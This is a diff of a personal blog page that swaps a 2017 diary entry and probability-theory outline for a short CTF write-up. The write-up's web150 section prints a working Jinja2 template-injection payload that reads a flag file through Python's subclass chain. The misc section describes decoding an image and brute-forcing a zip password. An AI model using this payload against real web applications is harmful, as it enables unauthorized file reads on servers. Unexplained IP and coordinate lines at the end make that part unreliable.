@@ -13,8 +13,12 @@
     
   
   
-  <meta name="twitter:title" content="概率论提纲"/>
-  <meta name="twitter:description" content="gay率论提纲."/>
+  <meta name="twitter:title" content=""/>
+  <meta name="twitter:description" content="web150 本来想考的是jinja模版注入的任意命令执行，然后想了想算了，直接任意文件读取算了，所以最后分值就定了150，权限刚开始忘记设了，直接是root。。。。在比赛中间修了一下，但是还是让可以写shell，最终payload只需要读文件就行了，shell啥的你们想放就放吧。
+/sachabv{{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;./flag&#39;).read() }}  misc 这是啥 首先拿到一个文件，发现都是000，111的，所以我们知道这就是一个图片，将1转换为255，之后反色，或者将1转为0，0转为255，获得验证码得到一个base64字符串，揭秘后为压缩包。暴力破解得到密码hgame，即可得到密码
+39.72.183.13
+119.461208 / 35.428588
+118.767413 / 32.041544,118.767413"/>
   
     <meta name="twitter:site" content="@ngc7293"/>
   
@@ -30,7 +34,7 @@
 		<meta name="author" content="ngc7293">
 		
 		<meta name="generator" content="Hugo 0.36.1" />
-		<title>概率论提纲 &middot; ngc7293&#39;s blog</title>
+		<title> &middot; ngc7293&#39;s blog</title>
 		<link rel="shortcut icon" href="http://ngc7.cn/images/favicon.ico">
 		<link rel="stylesheet" href="http://ngc7.cn/css/style.css">
 		<link rel="stylesheet" href="http://ngc7.cn/css/highlight.css">
@@ -68,21 +72,13 @@
             <article>
                 <header>
                     <h1>
-                        概率论提纲
+                        
                     </h1>
                     <h2 class="headline">
-                    Dec 30, 2017 00:00
-                    · 43 words
+                    Jan 1, 0001 00:00
+                    · 15 words
                     · 1 minute read
                       <span class="tags">
-                      
-                      
-                          
-                              <a href="http://ngc7.cn/tags/%E6%A6%82%E7%8E%87%E8%AE%BA">概率论</a>
-                          
-                              <a href="http://ngc7.cn/tags/daily">daily</a>
-                          
-                      
                       
                       </span>
                     </h2>
@@ -92,134 +88,38 @@
                     <div id="toc">
                       <nav id="TableOfContents">
 <ul>
-<li><a href="#2017-12-27">2017-12-27</a></li>
+<li><a href="#web150">web150</a></li>
+<li><a href="#misc-这是啥">misc 这是啥</a></li>
 </ul>
 </nav>
                     </div>
                   
                 
                 <section id="post-body">
-                    <h1 id="2017-12-27">2017-12-27</h1>
+                    
 
-<p>今天写完了爬虫的解析部分，但是发现居然还要模拟登陆，虽然说不是很麻烦，但是拖着还是没有写，debug了一下，基本上功能是可以了，但是怕不到东西，，，23333</p>
+<h1 id="web150">web150</h1>
 
-<p>
-真的很可惜，今天闲鱼了一天，但是也还好，算闲鱼了半天，我的k480也到了，感觉还不错，但是蓝牙不是非常的灵敏，明天是2017年的最后一天，后天是2018年的第一天，可能像我这样不可能有什么好的地方吧。</p>
+<p>本来想考的是jinja模版注入的任意命令执行，然后想了想算了，直接任意文件读取算了，所以最后分值就定了150，权限刚开始忘记设了，直接是root。。。。在比赛中间修了一下，但是还是让可以写shell，最终payload只需要读文件就行了，shell啥的你们想放就放吧。</p>
 
-<p>但是，令我十分高兴的事我的僚机居然回答了我邀请他的问题，但是貌似曲解了我的意思。。。。尴尴尬尬还好，像b乎这种地方也就我们会闲的没事看一下了。</p>
-
-<p>现在是晚上了，我就列一下概率论的提纲吧。</p>
-
-<blockquote>
-<p>概率论</p>
-
-<pre><code>  重要分布
-
-  离散
-
-      (0，1)分布
-
-      二项分布    
-
-      泊松分布
-
-  连续
-
-      均匀分布
-
-      指数分布
-
-      正态分布
-
-  分布函数
-
-  边缘分布
-
-  二位随机变量
-
-  概率分布以及概率密度
-
-  条件分布
-
-  数学分布[数学期望，方差，协方差，协方差矩阵]
-
-  大数定律，中心极限定理
+<pre><code class="language-python">/sachabv{{ ''.__class__.__mro__[2].__subclasses__()[40]('./flag').read() }}
 </code></pre>
 
-<p>数理统计</p>
+<h1 id="misc-这是啥">misc 这是啥</h1>
 
-<pre><code>  样本基本统计量[样本平均值，样本方差，样本标准差，样本k阶距，样本k阶原点距]
+<p>首先拿到一个文件，发现都是000，111的，所以我们知道这就是一个图片，将1转换为255，之后反色，或者将1转为0，0转为255，获得验证码得到一个base64字符串，揭秘后为压缩包。暴力破解得到密码hgame，即可得到密码</p>
 
-  经验分布函数
+<p>39.72.183.13</p>
 
-  抽样分布的常用统计量的分布[卡方分布，F分布，T分布]                  
+<p>119.461208 / 35.428588</p>
 
-  点估计
+<p>118.767413 / 32.041544,118.767413</p>
 
-      矩估计
-
-      最大似然估计
-
-  置信区间
-
-  假设检验
-
-  方差回归以及回归分析
-</code></pre>
-</blockquote>
-
-<p>2017年</p>
-
-<p>毕业的我回去看到我们的座位被一群小孩子取代</p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20170210_153858.jpg" alt="" /></p>
-
-<p>去了中国经济最发达的上海</p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20170402_154423.jpg" alt="" /></p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20170403_141507.jpg" alt="" /></p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20170403_122909_1.jpg" alt="" /></p>
-
-<p>养活了一盆花</p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG20170726134740.jpg" alt="" /></p>
-
-<p>这里是杭州</p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20170621_162712.jpg" alt="" /></p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20170621_182039.jpg" alt="" /></p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20170917_150128.jpg" alt="" /></p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20171027_184356.jpg" alt="" /></p>
-
-<p>去阿里见到了一堆大佬们</p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20171125_171945.jpg" alt="" /></p>
-
-<p>见识了钱塘江大潮</p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20171007_125203.jpg" alt="" /></p>
-
-<p>还有一个伟大的公司的两个伴随我成长的ip完季</p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com//image/blogimg_0529.jpg" alt="" /></p>
-
-<p>去北京打了我人生中第一个比赛</p>
-
-<p><img src="http://p1kaloi2x.bkt.clouddn.com/IMG_20170903_164055.jpg" alt="" /></p>
-
-<p>认识了hammer，三金等的一些朋友</p>
-
-<p>weiwandaixu&hellip;&hellip;</p>
                 </section>
             </article>
 
             
-                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fngc7.cn%2fposts%2f12_30%2f - 2017_12_30 by @ngc7293"><span class="icon-twitter"> tweet</span></a>
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fngc7.cn%2fposts%2fhgame_misc%2f -  by @ngc7293"><span class="icon-twitter"> tweet</span></a>
 
 <a class="facebook" href="#" onclick="
     window.open(
